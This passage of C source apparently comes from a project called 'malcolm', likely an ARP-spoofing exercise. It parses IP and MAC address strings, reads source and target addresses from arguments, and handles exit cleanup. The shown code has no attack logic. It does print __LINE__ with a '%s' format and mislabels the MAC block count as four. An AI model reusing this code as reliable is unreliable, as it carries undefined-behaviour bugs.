        while((ptr_u8_pssd_ip_str[u8_lcl_pos + u8_lcl_cnt] >= '0' && ptr_u8_pssd_ip_str[u8_lcl_pos + u8_lcl_cnt] <= '9') && (u8_lcl_cnt < 3))
            {
            /**
            * Checking for overflow
            */
            if(u8_lcl_cnt < UINT8_MAX)
                {
                u8_lcl_cnt++;
                }
            else
                {
                #ifdef DEVELOPEMENT
                fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The unsigned 8 integer counter variable is going to overflow\n", __FILE__, __func__, __LINE__);
                #endif

                #ifdef DEMO
                fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
                #endif

                #ifdef PRODUCTION
                fprintf(stderr, "\033[1;31mERROR\033[0m\n");
                #endif

                /**
                * Return a failure to indicate the counter variable overflow
                */ 
                return (RETURN_FAILURE);
                } 
            }

        /**
        * Check if the number of character in the actual block ip is zero
        */
        if(u8_lcl_cnt == 0)
            {
            /**
            * Treat the case when the number of character in the actual block ip is zero
            */

            #ifdef DEVELOPEMENT
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the number of character in the actual block ip is zero\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return failure to indicate the number of character in the actual block ip is zero
            */
            return (RETURN_FAILURE);
            }
        else
            {
            /**
            * Treat the case when the number of character in the actual block ip is not zero
            */
            }

        /**
        * Check if the character after a block in ip address is not a '.' and not a NIL
        */
        if((ptr_u8_pssd_ip_str[u8_lcl_pos + u8_lcl_cnt] != '.') && (ptr_u8_pssd_ip_str[u8_lcl_pos + u8_lcl_cnt] != NIL))
            {
            /**
            * Treat the case when the character after a block in ip address is not a '.' and not a NIL
            */

            #ifdef DEVELOPEMENT
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the character after a block in ip address is not a '.' and not a NIL\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return failure to indicate the character after a block in ip address is not a '.' and not a NIL
            */
            return (RETURN_FAILURE);
            }
        else
            {
            /**
            * Treat the case when the character after a block in ip address is a '.' or a NIL
            */
            }

        u32_lcl_tmp = ft_atoi((char *) (ptr_u8_pssd_ip_str + u8_lcl_pos));

        /**
        * Check if the actual ip block is over the maximun value
        */
        if(u32_lcl_tmp > 255)
            {
            /**
            * Treat the case when the actual ip block is over the maximun value
            */

            #ifdef DEVELOPEMENT
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the actual ip block is over the maximun value\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return failure to indicate the actual ip block is over the maximun value
            */
            return (RETURN_FAILURE);
            }
        else
            {
            /**
            * Treat the case when the actual ip block is not over the maximun value
            */
            } 

        ptr_u8_pssd_ip[u8_lcl_pos_in_ip] = (uint8_t) u32_lcl_tmp;

        /**
        * Check if the addition of the position in the ip string with the counter overflow
        */
        if(u8_lcl_pos > (UINT8_MAX - u8_lcl_cnt))
            {
            /**
            * Treat the case when the addition of the position in the ip string with the counter overflow
            */

            #ifdef DEVELOPEMENT
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the addition of the position in the ip string with the counter overflow\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return failure to indicate the addition of the position in the ip string with the counter overflow
            */
            return (RETURN_FAILURE);
            }
        else
            {
            /**
            * Treat the case when the addition of the position in the ip string with the counter not overflow
            */

            u8_lcl_pos = u8_lcl_pos + u8_lcl_cnt;
            }

        /**
        * Checking for overflow
        */
        if(u8_lcl_pos_in_ip < UINT8_MAX)
            {
            u8_lcl_pos_in_ip++;
            }
        else
            {
            #ifdef DEVELOPEMENT
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The unsigned 8 integer counter variable is going to overflow\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return a failure to indicate the counter variable overflow
            */ 
            return (RETURN_FAILURE);
            } 

        /**
        * Check if the actual character of the ip string from the argument of the function is an ip block separator '.'
        */
        if((u8_lcl_pos_in_ip < IP_ADDRESS_BYTE_LEN) && (ptr_u8_pssd_ip_str[u8_lcl_pos] == '.'))
            {
            /**
            * Treat the case when the actual character of the ip string from the argument of the function is an ip block separator '.'
            */

            /**
            * Checking for overflow
            */
            if(u8_lcl_pos < UINT8_MAX)
                {
                u8_lcl_pos++;
                }
            else
                {
                #ifdef DEVELOPEMENT
                fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The unsigned 8 integer counter variable is going to overflow\n", __FILE__, __func__, __LINE__);
                #endif

                #ifdef DEMO
                fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
                #endif

                #ifdef PRODUCTION
                fprintf(stderr, "\033[1;31mERROR\033[0m\n");
                #endif

                /**
                * Return a failure to indicate the counter variable overflow
                */ 
                return (RETURN_FAILURE);
                } 
            }
        else
            {
            /**
            * Treat the case when the actual character of the ip string from the argument of the function is not an ip block separator '.'
            */
            } 
        }

    /**
    * Check if the end character of the ip string is not a NIL character
    */
    if(ptr_u8_pssd_ip_str[u8_lcl_pos] != NIL)
        {
        /**
        * Treat the case when the end character of the ip string is not a NIL character
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the end character of the ip string is not a NIL character\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the end character of the ip string is not a NIL character
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the end character of the ip string is a NIL character as expected
        */
        } 

    /**
    * Check if the number of address block is not four
    */
    if(u8_lcl_pos_in_ip < IP_ADDRESS_BYTE_LEN)
        {
        /**
        * Treat the case when the number of address block is not four
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the number of address block is not four\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the number of address block is not four
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the number of address block is four
        */
        } 

    return (RETURN_SUCCESS);
    }

uint8_t Fu8__get_mac_from_string(uint8_t *ptr_u8_pssd_mac, uint8_t *ptr_u8_pssd_mac_str)
    {
    /**
    * Assertion of argument
    */

    /**
    * Check if the array representing the mac is correctly pointing passed as an argument of the function
    */
    if(ptr_u8_pssd_mac == NULL)
        {
        /**
        * Treat the case when the array representing the mac is not correctly pointing passed as an argument of the function
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the array representing the mac is not correctly pointing passed as an argument of the function\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the array representing the mac is not correctly pointing passed as an argument of the function
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the array representing the mac is correctly pointing passed as an argument of the function
        */
        }

    /**
    * Check if the mac string is correctly pointing passed as an argument of the function
    */
    if(ptr_u8_pssd_mac_str == NULL)
        {
        /**
        * Treat the case when the mac string is not correctly pointing passed as an argument of the function
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the mac string is not correctly pointing passed as an argument of the function\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the mac string is not correctly pointing passed as an argument of the function
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the mac string is correctly pointing passed as an argument of the function
        */
        }

    /**
    * Creation of local variable
    */
    uint32_t u32_lcl_tmp;
    uint8_t  u8_lcl_cnt;
    uint8_t  u8_lcl_pos;
    uint8_t  u8_lcl_pos_in_mac;

    /**
    * Initialization of local variable
    */
    u32_lcl_tmp       = 0;
    u8_lcl_cnt        = 0;
    u8_lcl_pos        = 0;
    u8_lcl_pos_in_mac = 0;

    u8_lcl_pos_in_mac = 0;
    while((u8_lcl_pos_in_mac < MAC_ADDRESS_BYTE_LEN) && (ptr_u8_pssd_mac_str[u8_lcl_pos] != NIL))
        {
        u8_lcl_cnt = 0;
        while(((ptr_u8_pssd_mac_str[u8_lcl_pos + u8_lcl_cnt] >= '0' && ptr_u8_pssd_mac_str[u8_lcl_pos + u8_lcl_cnt] <= '9') || (ptr_u8_pssd_mac_str[u8_lcl_pos + u8_lcl_cnt] >= 'a' && ptr_u8_pssd_mac_str[u8_lcl_pos + u8_lcl_cnt] <= 'f') || (ptr_u8_pssd_mac_str[u8_lcl_pos + u8_lcl_cnt] >= 'A' && ptr_u8_pssd_mac_str[u8_lcl_pos + u8_lcl_cnt] <= 'F')) && (u8_lcl_cnt < 2))
            {
            /**
            * Checking for overflow
            */
            if(u8_lcl_cnt < UINT8_MAX)
                {
                u8_lcl_cnt++;
                }
            else
                {
                #ifdef DEVELOPEMENT
                fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The unsigned 8 integer counter variable is going to overflow\n", __FILE__, __func__, __LINE__);
                #endif

                #ifdef DEMO
                fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
                #endif

                #ifdef PRODUCTION
                fprintf(stderr, "\033[1;31mERROR\033[0m\n");
                #endif

                /**
                * Return a failure to indicate the counter variable overflow
                */ 
                return (RETURN_FAILURE);
                } 
            }

        /**
        * Check if the number of character in the actual block mac is zero
        */
        if(u8_lcl_cnt == 0)
            {
            /**
            * Treat the case when the number of character in the actual block mac is zero
            */

            #ifdef DEVELOPEMENT
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the number of character in the actual block mac is zero\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return failure to indicate the number of character in the actual block mac is zero
            */
            return (RETURN_FAILURE);
            }
        else
            {
            /**
            * Treat the case when the number of character in the actual block mac is not zero
            */
            }

        /**
        * Check if the character after a block in mac address is not a ':' and not a NIL
        */
        if((ptr_u8_pssd_mac_str[u8_lcl_pos + u8_lcl_cnt] != ':') && (ptr_u8_pssd_mac_str[u8_lcl_pos + u8_lcl_cnt] != NIL))
            {
            /**
            * Treat the case when the character after a block in mac address is not a ':' and not a NIL
            */

            #ifdef DEVELOPEMENT
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the character after a block in mac address is not a ':' and not a NIL\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return failure to indicate the character after a block in mac address is not a ':' and not a NIL
            */
            return (RETURN_FAILURE);
            }
        else
            {
            /**
            * Treat the case when the character after a block in mac address is a ':' or a NIL
            */
            }

        u32_lcl_tmp = ft_hex_str_to_ui((char *) (ptr_u8_pssd_mac_str + u8_lcl_pos));

        /**
        * Check if the actual mac block is over the maximun value
        */
        if(u32_lcl_tmp > 255)
            {
            /**
            * Treat the case when the actual mac block is over the maximun value
            */

            #ifdef DEVELOPEMENT
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the actual mac block is over the maximun value\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return failure to indicate the actual mac block is over the maximun value
            */
            return (RETURN_FAILURE);
            }
        else
            {
            /**
            * Treat the case when the actual mac block is not over the maximun value
            */
            } 

        ptr_u8_pssd_mac[u8_lcl_pos_in_mac] = (uint8_t) u32_lcl_tmp;

        /**
        * Check if the addition of the position in the mac string with the counter overflow
        */
        if(u8_lcl_pos > (UINT8_MAX - u8_lcl_cnt))
            {
            /**
            * Treat the case when the addition of the position in the mac string with the counter overflow
            */

            #ifdef DEVELOPEMENT
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the addition of the position in the mac string with the counter overflow\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return failure to indicate the addition of the position in the mac string with the counter overflow
            */
            return (RETURN_FAILURE);
            }
        else
            {
            /**
            * Treat the case when the addition of the position in the mac string with the counter not overflow
            */

            u8_lcl_pos = u8_lcl_pos + u8_lcl_cnt;
            }

        /**
        * Checking for overflow
        */
        if(u8_lcl_pos_in_mac < UINT8_MAX)
            {
            u8_lcl_pos_in_mac++;
            }
        else
            {
            #ifdef DEVELOPEMENT
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The unsigned 8 integer counter variable is going to overflow\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Return a failure to indicate the counter variable overflow
            */ 
            return (RETURN_FAILURE);
            } 

        /**
        * Check if the actual character of the mac string from the argument of the function is an mac block separator ':'
        */
        if((u8_lcl_pos_in_mac < MAC_ADDRESS_BYTE_LEN) && (ptr_u8_pssd_mac_str[u8_lcl_pos] == ':'))
            {
            /**
            * Treat the case when the actual character of the mac string from the argument of the function is an mac block separator ':'
            */

            /**
            * Checking for overflow
            */
            if(u8_lcl_pos < UINT8_MAX)
                {
                u8_lcl_pos++;
                }
            else
                {
                #ifdef DEVELOPEMENT
                fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The unsigned 8 integer counter variable is going to overflow\n", __FILE__, __func__, __LINE__);
                #endif

                #ifdef DEMO
                fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
                #endif

                #ifdef PRODUCTION
                fprintf(stderr, "\033[1;31mERROR\033[0m\n");
                #endif

                /**
                * Return a failure to indicate the counter variable overflow
                */ 
                return (RETURN_FAILURE);
                } 
            }
        else
            {
            /**
            * Treat the case when the actual character of the mac string from the argument of the function is not an mac block separator ':'
            */
            } 
        }

    /**
    * Check if the end character of the mac string is not a NIL character
    */
    if(ptr_u8_pssd_mac_str[u8_lcl_pos] != NIL)
        {
        /**
        * Treat the case when the end character of the mac string is not a NIL character
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the end character of the mac string is not a NIL character\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the end character of the mac string is not a NIL character
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the end character of the mac string is a NIL character as expected
        */
        } 

    /**
    * Check if the number of address block in the mac string is not six
    */
    if(u8_lcl_pos_in_mac < MAC_ADDRESS_BYTE_LEN)
        {
        /**
        * Treat the case when the number of address block in mac string is not four
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the number of address block in mac string is not four\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the number of address block in mac string is not four
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the number of address block is six
        */
        }

    return (RETURN_SUCCESS);
    }

void Fv__close_all_data_and_exit(int signal __attribute__((unused)))
    {
    /**
    * Creation of local variable
    */
    uint8_t u8_lcl_return_from_function;

    /**
    * Initialization of local variable
    */
    u8_lcl_return_from_function = 0;

    /**
    * Check if the global address to the structure malcolm data is not correctly pointing
    */
    if(ptr_cstc_gbl_malcolm_data == NULL)
        {
        /**
        * Treat the case when the global address to the structure malcolm data is not correctly pointing
        */

        /**
        * Exit the program
        */
        exit(EXIT_SUCCESS);
        }
    else
        {
        /**
        * Treat the case when the global address to the structure malcolm data is correctly pointing
        */
        }

    (void) Fv__display_structure_malcolm_data(ptr_cstc_gbl_malcolm_data);

    /**
    * Check if the global structure malcolm data is initialized
    */
    if((ptr_cstc_gbl_malcolm_data->u8_global_status_ & FIRST_BIT) != FALSE)
        {
        /**
        * Treat the case when the global structure malcolm data is initialized
        */

        /**
        * Closing the global structure malcolm data
        */
        u8_lcl_return_from_function = RETURN_FAILURE;
        u8_lcl_return_from_function = Fu8__close_structure_malcolm_data(ptr_cstc_gbl_malcolm_data);

        /**
        * Check if function to close the global structure malcolm data succeeded
        */
        if(u8_lcl_return_from_function != RETURN_SUCCESS)
            {
            /**
            * Treat the case when the function to close the global structure malcolm data failed
            */

            #ifdef DEVELOPEMENT
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to close the global structure malcolm data failed\n", __FILE__, __func__, __LINE__);
            #endif

            #ifdef DEMO
            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
            #endif

            #ifdef PRODUCTION
            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
            #endif

            /**
            * Exit the program
            */
            exit(EXIT_FAILURE);
            }
        else
            {
            /**
            * Treat the case when function to close the global structure malcolm data succeeded
            */
            }

        /**
        * Check if the flag error is set in the global structure malcolm data
        */
        if((ptr_cstc_gbl_malcolm_data->u8_global_status_ & SECOND_BIT) != FALSE)
            {
            /**
            * Treat the case when the flag error is set in the global structure malcolm data
            */

            /**
            * Exit the program
            */
            exit(EXIT_FAILURE);
            }
        else
            {
            /**
            * Treat the case when the flag error is not set in the global structure malcolm data
            */

            /**
            * Exit the program
            */
            exit(EXIT_SUCCESS);
            }
        }
    else
        {
        /**
        * Treat the case when the global structure malcolm data is not initialized
        */
        }

    /**
    * Exit the program
    */
    exit(EXIT_SUCCESS);
    }

uint8_t Fu8__get_value_from_argument_data(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm_data)
    {
    /**
    * Assertion of argument
    */

    /**
    * Check if the structure malcolm data is correctly pointing passed as an argument of the function
    */
    if(ptr_cstc_pssd_malcolm_data == NULL)
        {
        /**
        * Treat the case when the structure malcolm data is not correctly pointing passed as an argument of the function
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the structure malcolm data is not correctly pointing passed as an argument of the function\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the structure malcolm data is not correctly pointing passed as an argument of the function
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the structure malcolm data is correctly pointing passed as an argument of the function
        */
        }

    /**
    * Check if the structure malcolm data is not initialized
    */
    if((ptr_cstc_pssd_malcolm_data->u8_global_status_ & FIRST_BIT) == FALSE)
        {
        /**
        * Treat the case when the structure malcolm data is not initialized
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the structure malcolm data is not initialized\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the structure malcolm data is not initialized
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the structure malcolm data is initialized as expected
        */
        }

    /**
    * Check if the structure program argument in the structure malcolm data passed in argument of the function is not initialized
    */
    if((ptr_cstc_pssd_malcolm_data->sstc_program_argument_.u8_global_status_ & FIRST_BIT) == FALSE)
        {
        /**
        * Treat the case when the structure program argument in the structure malcolm data passed in argument of the function is not initialized
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the structure program argument in the structure malcolm data passed in argument of the function is not initialized\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the structure program argument in the structure malcolm data passed in argument of the function is not initialized
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when the structure program argument in the structure malcolm data passed in argument of the function is initialized
        */
        }

    /**
    * Creation of local variable
    */
    uint8_t  u8_lcl_return_from_function;

    /**
    * Initialization of local variable
    */
    u8_lcl_return_from_function = RETURN_FAILURE;

    /**
    * Getting the value of the source ip from the argument
    */
    u8_lcl_return_from_function = RETURN_FAILURE;
    u8_lcl_return_from_function = Fu8__get_ip_from_string(ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_, ptr_cstc_pssd_malcolm_data->sstc_program_argument_.dbl_ptr_u8_ip_or_mac_address_str_[0]);

    /**
    * Check if function to get the value of the source ip from the argument succeeded
    */
    if(u8_lcl_return_from_function != RETURN_SUCCESS)
        {
        /**
        * Treat the case when the function to get the value of the source ip from the argument failed
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to get the value of the source ip from the argument failed\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the function to get the value of the source ip from the argument failed
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when function to get the value of the source ip from the argument succeeded
        */
        }

    /**
    * Getting the value of the source mac from the argument
    */
    u8_lcl_return_from_function = RETURN_FAILURE;
    u8_lcl_return_from_function = Fu8__get_mac_from_string(ptr_cstc_pssd_malcolm_data->u8_source_mac_addr_, ptr_cstc_pssd_malcolm_data->sstc_program_argument_.dbl_ptr_u8_ip_or_mac_address_str_[1]);

    /**
    * Check if function to get the value of the source mac from the argument succeeded
    */
    if(u8_lcl_return_from_function != RETURN_SUCCESS)
        {
        /**
        * Treat the case when the function to get the value of the source mac from the argument failed
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to get the value of the source mac from the argument failed\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
        * Return failure to indicate the function to get the value of the source mac from the argument failed
        */
        return (RETURN_FAILURE);
        }
    else
        {
        /**
        * Treat the case when function to get the value of the source mac from the argument succeeded
        */
        }

    /**
    * Getting the value of the target ip from the argument
    */
    u8_lcl_return_from_function = RETURN_FAILURE;
    u8_lcl_return_from_function = Fu8__get_ip_from_string(ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_, ptr_cstc_pssd_malcolm_data->sstc_program_argument_.dbl_ptr_u8_ip_or_mac_address_str_[2]);

    /**
    * Check if function to get the value of the target ip from the argument succeeded
    */
    if(u8_lcl_return_from_function != RETURN_SUCCESS)
        {
        /**
        * Treat the case when the function to get the value of the target ip from the argument failed
        */

        #ifdef DEVELOPEMENT
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to get the value of the target ip from the argument failed\n", __FILE__, __func__, __LINE__);
        #endif

        #ifdef DEMO
        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
        #endif

        #ifdef PRODUCTION
        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
        #endif

        /**
